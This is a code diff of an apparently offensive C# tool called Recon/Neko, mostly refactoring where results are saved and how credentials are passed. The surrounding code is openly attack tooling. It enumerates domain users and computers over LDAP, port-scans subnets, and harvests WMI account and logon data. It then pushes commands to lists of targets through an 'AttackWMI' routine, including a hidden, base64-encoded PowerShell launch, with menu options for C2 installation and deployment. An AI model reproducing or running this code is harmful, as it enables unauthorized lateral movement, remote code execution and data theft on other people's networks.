@@ -66,9 +66,8 @@ namespace Recon
                     Console.WriteLine("\r\n" +
                         "Enter password:");
                     Password = Console.ReadLine();
-                    //Get computer domain
 
-                    //f program was unable to get domain, get domain info
+                    //if program was unable to get domain, get domain info
                     if (domainURL == "")
                     {
                         Console.WriteLine("\r\nPlease enter the domain for searching:");
@@ -116,7 +115,7 @@ namespace Recon
                 }
 
                 //Prompt user decision on recon or deployment via WMI
-                Console.WriteLine("Options: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n\r\n 4: Command and Control \r\n");
+                Console.WriteLine("\r\nOptions: \r\n\r\n 1: Recon \r\n\r\n 2: Installation from C2 via WMI + PowerShell \r\n\r\n 3: Deployment via WMI \r\n\r\n 4: Command and Control \r\n");
                 Console.WriteLine("Make your selection:");
                 string attackType = Console.ReadLine();
                 while (attackType != "1" && attackType != "2" && attackType != "3" && attackType != "4")
@@ -125,15 +124,26 @@ namespace Recon
                     attackType = Console.ReadLine();
                 }
 
+
                 //Create document path for scan results
                 string docPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
+                //Create sub folder
+                string nekoFolder = Path.Combine(docPath, "Neko");
+
+                if (!File.Exists(nekoFolder))
+                {
+                    //Create folder for results if it doesn't exist
+                    Directory.CreateDirectory(nekoFolder);
+                }
+
+                Console.WriteLine("\r\nResults will be written to " + nekoFolder);
 
 
 
                 if (attackType == "1")
                 {
-                    Console.WriteLine("Recon options: \r\n\r\n 1: Local machine \r\n\r\n 2: Domain \r\n\r\n 3: Network");
+                    Console.WriteLine("\r\nRecon options: \r\n\r\n 1: Local machine \r\n\r\n 2: Domain \r\n\r\n 3: Network");
                     string reconChoice = Console.ReadLine();
                     while (reconChoice != "1" && reconChoice != "2" && reconChoice != "3")
                     {
@@ -144,7 +154,7 @@ namespace Recon
 
 
                     //Create text file for results
-                    using (StreamWriter outputFile = new StreamWriter(Path.Combine(docPath, "results.txt")))
+                    using (StreamWriter outputFile = new StreamWriter(Path.Combine(nekoFolder, "recon.csv")))
                     {
                         outputFile.WriteLine("Results of Recon:" + "\r\n\r\n");
                     }
@@ -219,7 +229,7 @@ namespace Recon
                                     Console.WriteLine(userAccount.LastLogoff);
                                     Console.WriteLine(userAccount.MemberOf);
                                     Console.WriteLine(userAccount.AdminCount);
-                                    File.AppendAllText(docPath + "\\results.txt", "\r\n\r\nSAM Account: " + userAccount.SamAccountName + Environment.NewLine + "Account SID: " + userAccount.SID +
+                                    File.AppendAllText(nekoFolder + "\\LDAP User Recon.csv", "\r\n\r\nSAM Account: " + userAccount.SamAccountName + Environment.NewLine + "Account SID: " + userAccount.SID +
                                         Environment.NewLine + "First Name: " + userAccount.FirstName + Environment.NewLine + "Last Name: " + userAccount.LastName + Environment.NewLine +
                                         "Street Address: " + userAccount.StreetAddress + Environment.NewLine + "Director Reports: " + userAccount.DirectReports + Environment.NewLine +
                                         "Last Logon: " + userAccount.LastLogon + Environment.NewLine + "Last Logoff: " + userAccount.LastLogoff + Environment.NewLine + "Member of: " +
@@ -240,7 +250,7 @@ namespace Recon
                                     Console.WriteLine(computer.ComputerInfo);
                                     Console.WriteLine(computer.lastLogon);
                                     //Adds last logon for found computers
-                                    File.AppendAllText(docPath + "\\results.txt", Environment.NewLine + "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.lastLogon);
+                                    File.AppendAllText(nekoFolder + "\\LDAP Computer Recon.csv", Environment.NewLine + "Computer Name: " + computer.ComputerInfo + Environment.NewLine + "Last Logon: " + computer.lastLogon);
                                 }
                             }
                             catch(Exception e)
@@ -419,12 +429,6 @@ namespace Recon
                                 Console.WriteLine("Please enter new domain to use:");
                                 domainURL = Console.ReadLine();
                             }
-                            //Get Username
-                            Console.WriteLine("Enter user name:");
-                            string wmiUsername = Console.ReadLine();
-                            //Password
-                            Console.WriteLine("Enter password:");
-                            string wmiPassword = Console.ReadLine();
 
                             //Get target list
                             Console.WriteLine("\r\n" +
@@ -446,7 +450,7 @@ namespace Recon
                             // Attack targets
                             foreach (string target in ipSplit)
                             {
-                                AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                                AttackWMI(Username, Password, domainURL, target, commandFile);
                             }
 
                         }
@@ -493,12 +497,6 @@ namespace Recon
                                 Console.WriteLine("Please enter new domain to use:");
                                 domainURL = Console.ReadLine();
                             }
-                            //Get Username
-                            Console.WriteLine("Enter user name:");
-                            string wmiUsername = Console.ReadLine();
-                            //Password
-                            Console.WriteLine("Enter password:");
-                            string wmiPassword = Console.ReadLine();
 
                             //Get target list
                             Console.WriteLine("\r\n" +
@@ -543,7 +541,7 @@ namespace Recon
                             // Attack targets
                             foreach (string target in ipSplit)
                             {
-                                AttackWMI(wmiUsername, wmiPassword, domainURL, target, commandFile);
+                                AttackWMI(Username, Password, domainURL, target, commandFile);
                             }
 
                             //Check if user wants to launch additional commands after payload installation
@@ -567,7 +565,7 @@ namespace Recon
                                 // Additional commands to attack targets
                                 foreach (string target in ipSplit)
                                 {
-                                    AttackWMI(wmiUsername, wmiPassword, domainURL, target, additionalCommandLine);
+                                    AttackWMI(Username, Password, domainURL, target, additionalCommandLine);
                                 }
                             }
                         }
@@ -586,13 +584,6 @@ namespace Recon
                     }
                     if(c2Choice == "y")
                     {
-
-                        //Get Username
-                        Console.WriteLine("Enter user name:");
-                        string wmiUsername = Console.ReadLine();
-                        //Password
-                        Console.WriteLine("Enter password:");
-                        string wmiPassword = Console.ReadLine();
 
                         //Get IP for target
                         Console.WriteLine("Please enter IP address for target: ");
@@ -632,7 +623,7 @@ namespace Recon
                         string obfuscatedCommand = Convert.ToBase64String(encoded);
 
                         string commandLine = "cmd.exe /c powershell -windowstyle hidden -noprofile -noninteractive -encodedcommand " + obfuscatedCommand;
-                        AttackWMI(wmiUsername, wmiPassword, domainURL, targetIP, commandLine);
+                        AttackWMI(Username, Password, domainURL, targetIP, commandLine);
                     }
                 }
 
@@ -722,7 +713,7 @@ namespace Recon
         }
 
 
-        public static void LocalMachine(string docPath)
+        public static void LocalMachine(string nekoFolder)
         {
             //Net commands
             try
@@ -758,7 +749,7 @@ namespace Recon
                     string netDomainResult = netProcess.StandardOutput.ReadToEnd();
                     string netErr = netProcess.StandardError.ReadToEnd();
                     //Append local machine info to results
-                    File.AppendAllText(docPath + "\\results.txt", netDomainResult + netErr + Environment.NewLine);
+                    File.AppendAllText(nekoFolder + "\\Local Machine Account Recon.csv", netDomainResult + netErr + Environment.NewLine);
                     Console.WriteLine(netDomainResult);
                 }
 
@@ -801,7 +792,7 @@ namespace Recon
                     string cmdDomainResult = cmdProcess.StandardOutput.ReadToEnd();
                     string cmdErr = cmdProcess.StandardError.ReadToEnd();
                     //Append local machine info to results
-                    File.AppendAllText(docPath + "\\results.txt", cmdDomainResult + cmdErr + Environment.NewLine);
+                    File.AppendAllText(nekoFolder + "\\Local Machine Network and Task Recon.csv", cmdDomainResult + cmdErr + Environment.NewLine);
                     Console.WriteLine(cmdDomainResult);
                 }
             }
@@ -833,7 +824,7 @@ namespace Recon
                 string scResult = scProcess.StandardOutput.ReadToEnd();
                 string scErr = scProcess.StandardError.ReadToEnd();
                 //Append local machine info to results
-                File.AppendAllText(docPath + "\\results.txt", scResult + scErr + Environment.NewLine);
+                File.AppendAllText(nekoFolder + "\\Local Machine Services.csv", scResult + scErr + Environment.NewLine);
                 Console.WriteLine(scResult);
 
                 //Regex matching pattern for SERVICE_NAME:
@@ -850,7 +841,7 @@ namespace Recon
                     //serviceList.Add(matches[i].ToString());
                     string services = matches[i].ToString();
                     Console.WriteLine(services);
-                    File.AppendAllText(docPath + "\\results.txt", services + Environment.NewLine);
+                    File.AppendAllText(nekoFolder + "\\Local Machine Services.csv", services + Environment.NewLine);
                     string scSDSHOW = "/c sc sdshow " + services;
                     Process scSdProcess = new Process();
                     //Configure process
@@ -871,7 +862,7 @@ namespace Recon
                     string scSD = scSdProcess.StandardOutput.ReadToEnd();
                     string scSdErr = scSdProcess.StandardError.ReadToEnd();
                     //Append local machine info to results
-                    File.AppendAllText(docPath + "\\results.txt", scSD + scSdErr + Environment.NewLine);
+                    File.AppendAllText(nekoFolder + "\\Local Machine Services.csv", scSD + scSdErr + Environment.NewLine);
                     Console.WriteLine(scSD);
                 }
 
@@ -908,7 +899,7 @@ namespace Recon
 
 
         //WMI recon function
-        public static void WmiFunction(string hostname, string wmiUsername, string wmiPassword, string domainURL, string docPath)
+        public static void WmiFunction(string hostname, string Username, string Password, string domainURL, string nekoFolder)
         {
             try
             {
@@ -918,9 +909,9 @@ namespace Recon
                 //Set impersonation level
                 options.Impersonation = ImpersonationLevel.Impersonate;
                 //Set username
-                options.Username = wmiUsername;
+                options.Username = Username;
                 //Set password
-                options.Password = wmiPassword;
+                options.Password = Password;
                 options.Authority = "ntlmdomain:" + domainURL;
 
                 //Set scope
@@ -948,7 +939,7 @@ namespace Recon
                         "Manufacturer      : " + m["Manufacturer"] + "\r\n" +
                         "OS Architecture   : " + m["OSArchitecture"] + "\r\n";
                         ;
-                        File.AppendAllText(docPath + "\\results.txt", wmiScanResults + Environment.NewLine);
+                        File.AppendAllText(nekoFolder + "\\WMI Computer Info.csv", wmiScanResults + Environment.NewLine);
                         Console.WriteLine(wmiScanResults);
                     }
 
@@ -982,7 +973,7 @@ namespace Recon
                            "SID: " + user["SID"] + "\r\n" +
                            "Password Expires: " + user["PasswordExpires"] + "\r\n" +
                            "Password Changeable: " + user["PasswordChangeable"] + "\r\n\r\n";
-                        File.AppendAllText(docPath + "\\results.txt", userResults + Environment.NewLine);
+                        File.AppendAllText(nekoFolder + "\\WMI User Account Info.csv", userResults + Environment.NewLine);
                         Console.WriteLine(userResults);
                     }
                 }
@@ -1010,7 +1001,7 @@ namespace Recon
                             "Authentication: " + logon["AuthenticationPackage"] + "\r\n" +
                             "Logon ID: " + logon["LogonId"] + "\r\n" +
                             "Logon Type: " + logon["LogonType"] + "\r\n\r\n";
-                        File.AppendAllText(docPath + "\\results.txt", logonResults + Environment.NewLine);
+                        File.AppendAllText(nekoFolder + "\\WMI Logon Info.csv", logonResults + Environment.NewLine);
                         Console.WriteLine(logonResults);
                     }
                 }
@@ -1034,7 +1025,7 @@ namespace Recon
                     {
                         string UserResults = "UserName: " + User["UserName"] + "\r\n" +
                             "Timezone: " + User["CurrentTimeZone"] + "\r\n\r\n";
-                        File.AppendAllText(docPath + "\\results.txt", UserResults + Environment.NewLine);
+                        File.AppendAllText(nekoFolder + "\\WMI Logon Info.csv", UserResults + Environment.NewLine);
                         Console.WriteLine(UserResults);
                     }
                 }
@@ -1075,7 +1066,7 @@ namespace Recon
 
 
         //For attacking found WMI targets later
-        public static void AttackWMI(string wmiUsername, string wmiPassword, string domainURL, string hostname, string commandFile)
+        public static void AttackWMI(string Username, string Password, string domainURL, string hostname, string commandFile)
         {
 
 
@@ -1087,9 +1078,9 @@ namespace Recon
                 //Set impersonation level
                 options.Impersonation = ImpersonationLevel.Impersonate;
                 //Pipe in and set username
-                options.Username = wmiUsername;
+                options.Username = Username;
                 //Set password
-                options.Password = wmiPassword;
+                options.Password = Password;
                 //Set authority
                 options.Authority = "ntlmdomain:" + domainURL;
 
@@ -1150,7 +1141,7 @@ namespace Recon
 
 
         //well known ports methods
-        public static bool MultithreadScan(string strippedIP, string portChoice, string type, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
+        public static bool MultithreadScan(string strippedIP, string portChoice, string type, string Username, string Password, string domainURL, string nekoFolder, List<string> wmiList)
         {
 
             //Full port scan
@@ -1160,16 +1151,16 @@ namespace Recon
                 //Spool up multiple threads split by ports
                 try
                 {
-                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 65536, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread.Start();
 
-                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 65536, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread2.Start();
 
-                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 65536, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread3.Start();
 
-                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 65536, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 65536, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread4.Start();
 
                     while (thread4.IsAlive == true)
@@ -1190,16 +1181,16 @@ namespace Recon
                 //Spool up multiple threads based on ports
                 try
                 {
-                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread = new Thread(() => Ports(strippedIP, 1, 65, 1, 1025, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread.Start();
 
-                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread2 = new Thread(() => Ports(strippedIP, 64, 129, 1, 1025, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread2.Start();
 
-                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread3 = new Thread(() => Ports(strippedIP, 128, 193, 1, 1025, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread3.Start();
 
-                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 1025, type, wmiUsername, wmiPassword, domainURL, docPath, wmiList));
+                    Thread thread4 = new Thread(() => Ports(strippedIP, 192, 256, 1, 1025, type, Username, Password, domainURL, nekoFolder, wmiList));
                     thread4.Start();
 
                     while (thread4.IsAlive == true)
@@ -1217,7 +1208,7 @@ namespace Recon
         }
 
         //well known ports
-        public static void Ports(string strippedIP, int startIp, int stopIp, int portStart, int portStop, string type, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
+        public static void Ports(string strippedIP, int startIp, int stopIp, int portStart, int portStop, string type, string Username, string Password, string domainURL, string nekoFolder, List<string> wmiList)
         {
             // WMI Scan
             if (type == "1")
@@ -1241,12 +1232,12 @@ namespace Recon
                                     Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.");
                                     results = "Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.";
                                     //Append results to text file
-                                    File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
+                                    File.AppendAllText(nekoFolder + "\\Network IP Scan.csv", results + Environment.NewLine + Environment.NewLine);
                                     if (results.Contains("succeeded") && (j) == 135)
                                     {
                                         Console.WriteLine("Port 135 confirmed");
                                         //Launch WMI recon info
-                                        WmiFunction(strippedIP + Convert.ToString(i), wmiUsername, wmiPassword, domainURL, docPath);
+                                        WmiFunction(strippedIP + Convert.ToString(i), Username, Password, domainURL, nekoFolder);
                                         //Add to WMI list
                                         wmiList.Add(strippedIP + Convert.ToString(i));
 
@@ -1284,7 +1275,7 @@ namespace Recon
                                     Console.WriteLine("Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.");
                                     results = "Connection to " + strippedIP + Convert.ToString(i) + " on port: " + Convert.ToString(j) + " succeeded.";
                                     //Append results to text file
-                                    File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
+                                    File.AppendAllText(nekoFolder + "\\Network IP Scan.csv", results + Environment.NewLine + Environment.NewLine);
                                 }
                             }
                         }
@@ -1299,7 +1290,7 @@ namespace Recon
 
 
         //selected port scan method
-        public static bool SelectedPortScan(string strippedIp, string scanType, string wmiUsername, string wmiPassword, string domainURL, string docPath, List<string> wmiList)
+        public static bool SelectedPortScan(string strippedIp, string scanType, string Username, string Password, string domainURL, string nekoFolder, List<string> wmiList)
         {
             if (scanType == "1")
             {
@@ -1343,12 +1334,12 @@ namespace Recon
                                         Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.");
                                         results = "Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.";
                                         //Append results to text file
-                                        File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
+                                        File.AppendAllText(nekoFolder + "\\Network IP Scan.csv", results + Environment.NewLine + Environment.NewLine);
                                         if (results.Contains("succeeded") && Convert.ToInt32(portNumber) == 135)
                                         {
                                             Console.WriteLine("Port 135 confirmed");
                                             //Launch WMI recon
-                                            WmiFunction(strippedIp + Convert.ToString(i), wmiUsername, wmiPassword, domainURL, docPath);
+                                            WmiFunction(strippedIp + Convert.ToString(i), Username, Password, domainURL, nekoFolder);
                                             //Add host to WMI list
                                             wmiList.Add(strippedIp + Convert.ToString(i));
                                         }
@@ -1400,7 +1391,7 @@ namespace Recon
                                         Console.WriteLine("Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.");
                                         results = "Connection to " + strippedIp + Convert.ToString(i) + " on port: " + Convert.ToInt32(portNumber) + " succeeded.";
                                         //Append results to text document
-                                        File.AppendAllText(docPath + "\\results.txt", results + Environment.NewLine + Environment.NewLine);
+                                        File.AppendAllText(nekoFolder + "\\Network IP Scan.csv", results + Environment.NewLine + Environment.NewLine);
                                     }
                                 }
                             }
